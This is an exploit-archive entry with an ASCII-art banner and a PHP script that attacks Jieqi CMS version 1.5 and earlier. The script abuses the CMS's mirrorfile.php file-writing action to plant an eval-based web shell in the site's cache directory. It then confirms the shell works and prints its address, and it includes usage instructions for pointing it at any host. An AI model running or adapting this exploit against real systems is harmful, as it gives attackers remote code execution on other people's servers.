Jieqi CMS <= 1.5 Remote Code Execution Exploit
==============================================

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      0
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1


<?php
print_r(&#039;
+---------------------------------------------------------------------------+
Jieqi cms <= 1.5 remote code execution exploit
+---------------------------------------------------------------------------+
&#039;);
/**
* works regardless of php.ini settings
*/
if ($argc < 3) {
    print_r(&#039;
+---------------------------------------------------------------------------+
Usage: php &#039;.$argv[0].&#039; host path
host:      target server (ip/hostname)
path:      path to jieqi cms
Example:
php &#039;.$argv[0].&#039; localhost /
+---------------------------------------------------------------------------+
&#039;);
    exit;
}
error_reporting(7);
ini_set(&#039;max_execution_time&#039;, 0);
$host = $argv[1];
$path = $argv[2];
$url = &#039;http://&#039;.$host.$path.&#039;mirrorfile.php?filename=cache/seculab.php&action=writetofile&content=&#039;;
$shell = &#039;http://&#039;.$host.$path.&#039;cache/seculab.php&#039;;
$cmd = urlencode("<?php @eval(\$_POST[hamed]);?>test");
$str = file_get_contents($url.$cmd);
if ( file_get_contents($shell) == &#039;test&#039;)
exit("Expoilt Success!\nView Your shell:\t$shell\n");
else
exit("Exploit Failed!\n");
?>




